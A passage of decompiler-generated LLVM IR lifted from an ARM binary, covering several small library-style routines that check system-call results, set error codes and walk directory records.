dec_label_pc_13f5c.dec_label_pc_13f5c_crit_edge:  ; preds = %dec_label_pc_13f5c
  %v0_13f5c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13f5c

dec_label_pc_13f74:                               ; preds = %dec_label_pc_13f5c
  %v0_13f78.pre = load i32, i32* @r6, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_13f78 = add i32 %v0_13f78.pre, 104
  %v3_13f78 = inttoptr i32 %v2_13f78 to i32*
  %v4_13f78 = load i32, i32* %v3_13f78, align 4
  store i32 %v4_13f78, i32* %r2.global-to-local, align 4
  store i32 %v4_13f78, i32* %r3.global-to-local, align 4
  %v2_13f80 = icmp eq i32 %v4_13f78, 0
  store i1 %v2_13f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f80, label %dec_label_pc_13f98, label %dec_label_pc_13f88

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13f74
  call void @__pseudo_branch(i32 %v4_13f78)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13f94 = load i32, i32* @r0, align 4
  %v2_13f94 = inttoptr i32 %v1_13f94 to i32*
  store i32 0, i32* %v2_13f94, align 4
  %v0_13f9c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13f98

dec_label_pc_13f98:                               ; preds = %dec_label_pc_13f74, %dec_label_pc_13f88
  %v0_13f9c = phi i32 [ %v0_13f78.pre, %dec_label_pc_13f74 ], [ %v0_13f9c.pre, %dec_label_pc_13f88 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_13f9c = add i32 %v0_13f9c, 80
  %v3_13f9c = inttoptr i32 %v2_13f9c to i32*
  %v4_13f9c = load i32, i32* %v3_13f9c, align 4
  store i32 %v4_13f9c, i32* %r2.global-to-local, align 4
  store i32 %v4_13f9c, i32* %r3.global-to-local, align 4
  %v2_13fa4 = icmp eq i32 %v4_13f9c, 0
  store i1 %v2_13fa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fa4, label %dec_label_pc_13fbc, label %dec_label_pc_13fac

dec_label_pc_13fac:                               ; preds = %dec_label_pc_13f98
  call void @__pseudo_branch(i32 %v4_13f9c)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13fb8 = load i32, i32* @r0, align 4
  %v2_13fb8 = inttoptr i32 %v1_13fb8 to i32*
  store i32 0, i32* %v2_13fb8, align 4
  %v0_13fc0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13fbc

dec_label_pc_13fbc:                               ; preds = %dec_label_pc_13f98, %dec_label_pc_13fac
  %v0_13fc0 = phi i32 [ %v0_13f9c, %dec_label_pc_13f98 ], [ %v0_13fc0.pre, %dec_label_pc_13fac ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_13fc0 = add i32 %v0_13fc0, 28
  %v3_13fc0 = inttoptr i32 %v2_13fc0 to i32*
  %v4_13fc0 = load i32, i32* %v3_13fc0, align 4
  store i32 %v4_13fc0, i32* %r3.global-to-local, align 4
  %v1_13fc8 = inttoptr i32 %v4_13fc0 to i32*
  %v2_13fc8 = load i32, i32* %v1_13fc8, align 4
  store i32 %v2_13fc8, i32* %r2.global-to-local, align 4
  %v0_13fcc = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_13fd8 = call i32 @function_13340(i32 %v0_13fcc)
  %v0_13fdc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13fdc, label %bb64, label %.thread8

bb64:                                             ; preds = %dec_label_pc_13fbc
  %v2_13fdc = load i32, i32* %ip.global-to-local, align 4
  %v2_13fe0 = load i32, i32* %r4.global-to-local, align 4
  %v8_13fe0 = shl i32 %v2_13fe0, %v1_13fd8
  %v9_13fe0 = and i32 %v8_13fe0, %v1_13fd8
  %v8_13fe4 = shl i32 %v2_13fdc, %v9_13fe0
  %v9_13fe4 = and i32 %v8_13fe4, %v9_13fe0
  %v2_13fe8 = trunc i32 %v9_13fe4 to i16
  %v4_13fe8 = inttoptr i32 %v9_13fe4 to i16*
  store i16 %v2_13fe8, i16* %v4_13fe8, align 2
  store i32 0, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13fbc, %bb64
  %v10_13ffc = phi i32 [ %v1_13fd8, %dec_label_pc_13fbc ], [ 0, %bb64 ]
  ret i32 %v10_13ffc

; uselistorder directives
  uselistorder i32 %v9_13fe4, { 1, 0 }
  uselistorder i32 %v1_13fd8, { 1, 0, 2 }
  uselistorder i32 %v0_13f78.pre, { 1, 0 }
  uselistorder i32 %v1_13f6c, { 1, 0 }
  uselistorder i32 %v1_13f68, { 3, 2, 1, 0 }
  uselistorder i32 %v4_13ee0, { 1, 0, 2 }
  uselistorder i1 %v8_13e28, { 1, 2, 0 }
  uselistorder i32 %v2_13df8, { 1, 2, 0 }
  uselistorder i1 %v2_13de0, { 1, 0 }
  uselistorder i32 %v4_13dc4, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_13d90, { 1, 0 }
  uselistorder i32 %v3_13d60, { 1, 0 }
  uselistorder i32 %tmp52, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp49, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 15, 16, 17, 18, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 0, 12, 13, 14, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 8, 4, 0, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 17, 16, 1, 18 }
  uselistorder i32 (i32)* @function_13340, { 0, 5, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 47, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @function_13c88, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_13fbc, { 1, 0 }
  uselistorder label %dec_label_pc_13f98, { 1, 0 }
  uselistorder label %dec_label_pc_13f5c.lr.ph, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ea8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e84, { 3, 0, 1, 2 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_13df8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_13de0, { 1, 0 }
}

define i32 @function_1401c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1401c:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1401c = load i32, i32* @r4, align 4
  store i32 %v3_1401c, i32* %stack_var_-16, align 4
  %v3_14028 = urem i32 %arg3, 4096
  %v2_1402c = icmp eq i32 %v3_14028, 0
  br i1 %v2_1402c, label %dec_label_pc_14048, label %dec_label_pc_14034

dec_label_pc_14034:                               ; preds = %dec_label_pc_1401c
  %v0_14034 = call i32 @function_11734()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14040 = inttoptr i32 %v0_14034 to i32*
  store i32 22, i32* %v2_14040, align 4
  %v0_14078.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14078

dec_label_pc_14048:                               ; preds = %dec_label_pc_1401c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14074, label %dec_label_pc_14064

dec_label_pc_14064:                               ; preds = %dec_label_pc_14048
  %v0_14064 = call i32 @function_11734()
  %v0_14068 = load i32, i32* %r4.global-to-local, align 4
  %v1_14068 = sub i32 0, %v0_14068
  %v2_1406c = inttoptr i32 %v0_14064 to i32*
  store i32 %v1_14068, i32* %v2_1406c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14074

dec_label_pc_14074:                               ; preds = %dec_label_pc_14048, %dec_label_pc_14064
  %v0_14074 = phi i32 [ %arg1, %dec_label_pc_14048 ], [ -1, %dec_label_pc_14064 ]
  store i32 %v0_14074, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14078

dec_label_pc_14078:                               ; preds = %dec_label_pc_14034, %dec_label_pc_14074
  %v0_14078 = phi i32 [ %v0_14078.pre, %dec_label_pc_14034 ], [ %v0_14074, %dec_label_pc_14074 ]
  %v2_1407c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1407c, i32* @r4, align 4
  ret i32 %v0_14078

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14078, { 1, 0 }
  uselistorder label %dec_label_pc_14074, { 1, 0 }
}

define i32 @function_14084(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14084:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14084 = load i32, i32* @r4, align 4
  %v6_14084 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1408c = icmp eq i32 %arg2, 0
  store i32 126992, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1408c, label %dec_label_pc_140e0, label %dec_label_pc_140a4

dec_label_pc_140a4:                               ; preds = %dec_label_pc_14084
  %v1_140a4 = add i32 %arg2, 4
  %v2_140a4 = inttoptr i32 %v1_140a4 to i32*
  %v3_140a4 = load i32, i32* %v2_140a4, align 4
  store i32 %v3_140a4, i32* @r3, align 4
  %v1_140a8 = and i32 %v3_140a4, 67108864
  %v2_140a8 = icmp eq i32 %v1_140a8, 0
  br i1 %v2_140a8, label %dec_label_pc_140b0, label %dec_label_pc_140e0

dec_label_pc_140b0:                               ; preds = %dec_label_pc_140a4
  store i32 20, i32* @r2, align 4
  %v2_140b4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_140b4, i32* @r0, align 4
  %v0_140b8 = call i32 @function_11840()
  store i32 %v2_140b4, i32* @ip, align 4
  %v0_140e0.pre = load i32, i32* @r5, align 4
  %v0_140e8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_140e0

dec_label_pc_140e0:                               ; preds = %dec_label_pc_140a4, %dec_label_pc_14084, %dec_label_pc_140b0
  %v0_140e8 = phi i32 [ %arg3, %dec_label_pc_140a4 ], [ %arg3, %dec_label_pc_14084 ], [ %v0_140e8.pre, %dec_label_pc_140b0 ]
  %v0_140e4 = phi i32 [ %arg2, %dec_label_pc_140a4 ], [ 0, %dec_label_pc_14084 ], [ %v2_140b4, %dec_label_pc_140b0 ]
  %v0_140e0 = phi i32 [ %arg1, %dec_label_pc_140a4 ], [ %arg1, %dec_label_pc_14084 ], [ %v0_140e0.pre, %dec_label_pc_140b0 ]
  %v4_140f0 = call i32 @function_14640(i32 %v0_140e0, i32 %v0_140e4, i32 %v0_140e8, i32 8)
  store i32 %v3_14084, i32* @r4, align 4
  store i32 %v6_14084, i32* @r5, align 4
  ret i32 %v4_140f0

; uselistorder directives
  uselistorder label %dec_label_pc_140e0, { 2, 0, 1 }
}

define i32 @function_14104(i32 %arg1) local_unnamed_addr {
dec_label_pc_14104:
  %v0_14104 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14104, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14104
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14104, %bb
  %v0_14118 = phi i32 [ %arg1, %dec_label_pc_14104 ], [ 0, %bb ]
  ret i32 %v0_14118

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14124() local_unnamed_addr {
dec_label_pc_14124:
  %v4_14130 = load i32, i32* inttoptr (i32 127084 to i32*), align 4
  %v1_14134 = inttoptr i32 %v4_14130 to i32*
  %v2_14134 = load i32, i32* %v1_14134, align 4
  %v2_14138 = icmp eq i32 %v2_14134, 0
  br i1 %v2_14138, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_14124
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_14124, %bb
  %v1_14140 = phi i32 [ %v2_14134, %dec_label_pc_14124 ], [ 4096, %bb ]
  ret i32 %v1_14140

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_1414c() local_unnamed_addr {
dec_label_pc_1414c:
  %v1_1415c = load i32, i32* @r0, align 4
  ret i32 %v1_1415c
}

define i32 @function_14160(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14160:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14160 = load i32, i32* @r7, align 4
  store i32 %v3_14160, i32* %stack_var_-8, align 4
  %v0_1416c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1416c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1416c, -4095
  br i1 %tmp, label %dec_label_pc_1418c, label %dec_label_pc_1417c

dec_label_pc_1417c:                               ; preds = %dec_label_pc_14160
  %v0_1417c = call i32 @function_11734()
  %v0_14180 = load i32, i32* %r7.global-to-local, align 4
  %v1_14180 = sub i32 0, %v0_14180
  %v2_14184 = inttoptr i32 %v0_1417c to i32*
  store i32 %v1_14180, i32* %v2_14184, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1418c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1418c

dec_label_pc_1418c:                               ; preds = %dec_label_pc_14160, %dec_label_pc_1417c
  %v1_14190 = phi i32 [ %v0_1416c, %dec_label_pc_14160 ], [ -1, %dec_label_pc_1417c ]
  %v2_1418c = phi i32 [ %v3_14160, %dec_label_pc_14160 ], [ %v2_1418c.pre, %dec_label_pc_1417c ]
  store i32 %v2_1418c, i32* %r7.global-to-local, align 4
  ret i32 %v1_14190

; uselistorder directives
  uselistorder i32 %v0_1416c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1418c, { 1, 0 }
}

define i32 @function_14194() local_unnamed_addr {
dec_label_pc_14194:
  %v1_141a4 = load i32, i32* @r0, align 4
  ret i32 %v1_141a4
}

define i32 @function_141a8() local_unnamed_addr {
dec_label_pc_141a8:
  %v1_141b8 = load i32, i32* @r0, align 4
  ret i32 %v1_141b8
}

define i32 @function_141bc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_141bc:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_141bc = load i32, i32* @r5, align 4
  %v18_141bc = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_141ec, label %dec_label_pc_141d8

dec_label_pc_141d8:                               ; preds = %dec_label_pc_141bc
  %v0_141d8 = call i32 @function_11734()
  %v0_141dc = load i32, i32* @r5, align 4
  %v1_141dc = sub i32 0, %v0_141dc
  store i32 %v1_141dc, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  %v2_141e4 = inttoptr i32 %v0_141d8 to i32*
  store i32 %v1_141dc, i32* %v2_141e4, align 4
  br label %dec_label_pc_14240

dec_label_pc_141ec:                               ; preds = %dec_label_pc_141bc
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_141ec
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_141f4 = add i32 %arg2, %arg1
  store i32 %v3_141f4, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_141ec, %bb
  %v1_142304 = phi i32 [ %v18_141bc, %dec_label_pc_141ec ], [ %v3_141f4, %bb ]
  %v0_1422c2 = phi i32 [ 141, %dec_label_pc_141ec ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_14240, label %dec_label_pc_1422c

dec_label_pc_14200:                               ; preds = %dec_label_pc_1422c
  %v1_14200 = add i32 %v0_14200, 8
  %v2_14200 = inttoptr i32 %v1_14200 to i16*
  %v3_14200 = load i16, i16* %v2_14200, align 2
  %v4_14200 = zext i16 %v3_14200 to i32
  %v2_14204 = add i32 %v4_14200, %v0_14200
  store i32 %v2_14204, i32* %r3.global-to-local, align 4
  %v1_14208 = add i32 %v2_14204, -1
  %v2_14208 = inttoptr i32 %v1_14208 to i8*
  %v3_14208 = load i8, i8* %v2_14208, align 1
  %v4_14208 = zext i8 %v3_14208 to i32
  store i32 %v4_14208, i32* @r4, align 4
  %v1_1420c = call i32 @function_15d40(i32 %v1_1422c)
  %v0_14210 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14210, i32* @r1, align 4
  %v1_14214 = add i32 %v1_1420c, 1
  store i32 %v1_14214, i32* @r2, align 4
  %v0_14218 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14218, i32* @r0, align 4
  %v3_1421c = call i32 @function_11830(i32 %v0_14218, i32 %v0_14210, i32 %v1_14214)
  %v0_14220 = load i32, i32* %r7.global-to-local, align 4
  %v1_14220 = add i32 %v0_14220, 8
  %v2_14220 = inttoptr i32 %v1_14220 to i16*
  %v3_14220 = load i16, i16* %v2_14220, align 2
  %v4_14220 = zext i16 %v3_14220 to i32
  store i32 %v4_14220, i32* %r3.global-to-local, align 4
  %v0_14224 = load i32, i32* @r4, align 4
  %v1_14224 = trunc i32 %v0_14224 to i8
  %v3_14224 = add i32 %v0_14220, 10
  %v4_14224 = inttoptr i32 %v3_14224 to i8*
  store i8 %v1_14224, i8* %v4_14224, align 1
  %v0_14228 = load i32, i32* %r7.global-to-local, align 4
  %v1_14228 = load i32, i32* %r3.global-to-local, align 4
  %v2_14228 = add i32 %v1_14228, %v0_14228
  store i32 %v2_14228, i32* %r7.global-to-local, align 4
  %v1_14230.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1422c

dec_label_pc_1422c:                               ; preds = %.thread, %dec_label_pc_14200
  %v1_14230 = phi i32 [ %v1_14230.pre, %dec_label_pc_14200 ], [ %v1_142304, %.thread ]
  %v0_14200 = phi i32 [ %v2_14228, %dec_label_pc_14200 ], [ %v0_1422c2, %.thread ]
  %v1_1422c = add i32 %v0_14200, 10
  store i32 %v1_1422c, i32* %r6.global-to-local, align 4
  %v3_14230 = icmp ult i32 %v0_14200, %v1_14230
  %v1_14238 = add i32 %v0_14200, 11
  store i32 %v1_14238, i32* %r8.global-to-local, align 4
  br i1 %v3_14230, label %dec_label_pc_14200, label %dec_label_pc_14240

dec_label_pc_14240:                               ; preds = %dec_label_pc_1422c, %.thread, %dec_label_pc_141d8
  %v0_14240 = load i32, i32* @r5, align 4
  store i32 %v6_141bc, i32* @r5, align 4
  store i32 %v18_141bc, i32* @sl, align 4
  ret i32 %v0_14240

; uselistorder directives
  uselistorder i32 %v1_1422c, { 1, 0 }
  uselistorder i32 %v0_14200, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_141bc, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1422c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14250() local_unnamed_addr {
dec_label_pc_14250:
  %r7.global-to-local = alloca i32, align 4
  %v0_14258 = load i32, i32* @r1, align 4
  store i32 %v0_14258, i32* @r3, align 4
  %v0_14268 = load i32, i32* @r0, align 4
  store i32 %v0_14268, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14268, -4095
  br i1 %tmp, label %dec_label_pc_14288, label %dec_label_pc_14274

dec_label_pc_14274:                               ; preds = %dec_label_pc_14250
  %v0_14274 = call i32 @function_11734()
  %v0_14278 = load i32, i32* %r7.global-to-local, align 4
  %v1_14278 = sub i32 0, %v0_14278
  store i32 %v1_14278, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_14280 = inttoptr i32 %v0_14274 to i32*
  store i32 %v1_14278, i32* %v2_14280, align 4
  br label %dec_label_pc_14298

dec_label_pc_14288:                               ; preds = %dec_label_pc_14250
  %v2_14288 = icmp eq i32 %v0_14268, 0
  br i1 %v2_14288, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14288
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14288, %bb
  call void @__pseudo_cond_branch(i1 %v2_14288, i32 ptrtoint (i32* @global_var_144a0.479 to i32))
  br label %dec_label_pc_14298

dec_label_pc_14298:                               ; preds = %dec_label_pc_14274, %.thread
  %v0_14298 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_14298

; uselistorder directives
  uselistorder i32 %v0_14268, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14298, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_142a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_142a8:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_142a8 = load i32, i32* @r4, align 4
  store i32 %v3_142a8, i32* %stack_var_-16, align 4
  store i32 126992, i32* %r4.global-to-local, align 4
  %v4_142b8 = load i32, i32* @global_var_212d4.482, align 4
  %v2_142bc = icmp eq i32 %v4_142b8, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_142bc, label %dec_label_pc_142c8, label %dec_label_pc_142d8

dec_label_pc_142c8:                               ; preds = %dec_label_pc_142a8
  %v1_142cc = call i32 @function_1624c(i32 0)
  %v1_142d0 = icmp slt i32 %v1_142cc, 0
  br i1 %v1_142d0, label %dec_label_pc_142fc, label %dec_label_pc_142d8thread-pre-split

dec_label_pc_142d8thread-pre-split:               ; preds = %dec_label_pc_142c8
  %v0_142dc.pr = load i32, i32* %r5.global-to-local, align 4
  %v4_142d8.pre = load i32, i32* @global_var_212d4.482, align 4
  br label %dec_label_pc_142d8

dec_label_pc_142d8:                               ; preds = %dec_label_pc_142d8thread-pre-split, %dec_label_pc_142a8
  %v0_142e8 = phi i32 [ %v4_142d8.pre, %dec_label_pc_142d8thread-pre-split ], [ %v4_142b8, %dec_label_pc_142a8 ]
  %v1_142ec = phi i32 [ %v0_142dc.pr, %dec_label_pc_142d8thread-pre-split ], [ %arg1, %dec_label_pc_142a8 ]
  %v2_142dc = icmp eq i32 %v1_142ec, 0
  store i32 %v0_142e8, i32* %r4.global-to-local, align 4
  br i1 %v2_142dc, label %dec_label_pc_14300, label %dec_label_pc_142e8

dec_label_pc_142e8:                               ; preds = %dec_label_pc_142d8
  %v2_142ec = add i32 %v1_142ec, %v0_142e8
  %v1_142f0 = call i32 @function_1624c(i32 %v2_142ec)
  %v1_142f4 = icmp slt i32 %v1_142f0, 0
  br i1 %v1_142f4, label %dec_label_pc_142fc, label %dec_label_pc_142e8.dec_label_pc_14300_crit_edge

dec_label_pc_142e8.dec_label_pc_14300_crit_edge:  ; preds = %dec_label_pc_142e8
  %v0_14300.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14300

dec_label_pc_142fc:                               ; preds = %dec_label_pc_142e8, %dec_label_pc_142c8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14300

dec_label_pc_14300:                               ; preds = %dec_label_pc_142d8, %dec_label_pc_142e8.dec_label_pc_14300_crit_edge, %dec_label_pc_142fc
  %v0_14300 = phi i32 [ %v0_14300.pre, %dec_label_pc_142e8.dec_label_pc_14300_crit_edge ], [ -1, %dec_label_pc_142fc ], [ %v0_142e8, %dec_label_pc_142d8 ]
  %v2_14304 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14304, i32* @r4, align 4
  ret i32 %v0_14300

; uselistorder directives
  uselistorder i32 %v0_142e8, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1624c, { 1, 0 }
  uselistorder label %dec_label_pc_14300, { 2, 1, 0 }
}

define i32 @function_14314(i32 %arg1) local_unnamed_addr {
dec_label_pc_14314:
  %v1_14324 = load i32, i32* @r0, align 4
  ret i32 %v1_14324
}

define i32 @function_14328(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14328:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_14328 = load i32, i32* @r4, align 4
  store i32 %v3_14328, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_14340 = inttoptr i32 %arg2 to i8*
  %v3_14340 = call i32 @function_11790(i8* %v2_14340, i32 0)
  %v2_14344 = load i32, i32* %arg1, align 4
  store i32 %v2_14344, i32* %r3.global-to-local, align 4
  %v3_14344 = add i32 %tmp, 4
  %v4_14344 = inttoptr i32 %v3_14344 to i32*
  %v5_14344 = load i32, i32* %v4_14344, align 4
  store i32 %v5_14344, i32* %r4.global-to-local, align 4
  %v0_14348 = load i32, i32* %r5.global-to-local, align 4
  %v1_14348 = inttoptr i32 %v0_14348 to i32*
  store i32 %v2_14344, i32* %v1_14348, align 4
  %v3_14348 = add i32 %v0_14348, 4
  %v4_14348 = inttoptr i32 %v3_14348 to i32*
  %v5_14348 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14348, i32* %v4_14348, align 4
  %v0_1434c = load i32, i32* %r6.global-to-local, align 4
  %v1_1434c = add i32 %v0_1434c, 12
  %v2_1434c = inttoptr i32 %v1_1434c to i32*
  %v3_1434c = load i32, i32* %v2_1434c, align 4
  %v1_14350 = load i32, i32* %r5.global-to-local, align 4
  %v2_14350 = add i32 %v1_14350, 12
  %v3_14350 = inttoptr i32 %v2_14350 to i32*
  store i32 %v3_1434c, i32* %v3_14350, align 4
  %v0_14354 = load i32, i32* %r6.global-to-local, align 4
  %v1_14354 = add i32 %v0_14354, 96
  store i32 %v1_14354, i32* %r3.global-to-local, align 4
  %v1_14358 = inttoptr i32 %v1_14354 to i32*
  %v2_14358 = load i32, i32* %v1_14358, align 4
  store i32 %v2_14358, i32* %r3.global-to-local, align 4
  %v3_14358 = add i32 %v0_14354, 100
  %v4_14358 = inttoptr i32 %v3_14358 to i32*
  %v5_14358 = load i32, i32* %v4_14358, align 4
  store i32 %v5_14358, i32* %r4.global-to-local, align 4
  %v1_1435c = add i32 %v0_14354, 56
  %v2_1435c = inttoptr i32 %v1_1435c to i32*
  %v3_1435c = load i32, i32* %v2_1435c, align 4
  store i32 %v3_1435c, i32* %r2.global-to-local, align 4
  %v1_14360 = load i32, i32* %r5.global-to-local, align 4
  %v2_14360 = add i32 %v1_14360, 96
  %v3_14360 = inttoptr i32 %v2_14360 to i32*
  store i32 %v2_14358, i32* %v3_14360, align 4
  %v0_14364 = load i32, i32* %r4.global-to-local, align 4
  %v1_14364 = load i32, i32* %r5.global-to-local, align 4
  %v2_14364 = add i32 %v1_14364, 100
  %v3_14364 = inttoptr i32 %v2_14364 to i32*
  store i32 %v0_14364, i32* %v3_14364, align 4
  %v0_14368 = load i32, i32* %r6.global-to-local, align 4
  %v1_14368 = add i32 %v0_14368, 24
  store i32 %v1_14368, i32* %ip.global-to-local, align 4
  %v1_1436c = inttoptr i32 %v1_14368 to i32*
  %v2_1436c = load i32, i32* %v1_1436c, align 4
  store i32 %v2_1436c, i32* %ip.global-to-local, align 4
  %v3_1436c = add i32 %v0_14368, 28
  %v4_1436c = inttoptr i32 %v3_1436c to i32*
  %v5_1436c = load i32, i32* %v4_1436c, align 4
  store i32 %v5_1436c, i32* %lr.global-to-local, align 4
  %v0_14370 = load i32, i32* %r2.global-to-local, align 4
  %v1_14370 = load i32, i32* %r5.global-to-local, align 4
  %v2_14370 = add i32 %v1_14370, 56
  %v3_14370 = inttoptr i32 %v2_14370 to i32*
  store i32 %v0_14370, i32* %v3_14370, align 4
  %v0_14374 = load i32, i32* %r6.global-to-local, align 4
  %v1_14374 = add i32 %v0_14374, 72
  store i32 %v1_14374, i32* %r3.global-to-local, align 4
  %v1_14378 = add i32 %v0_14374, 32
  store i32 %v1_14378, i32* %r7.global-to-local, align 4
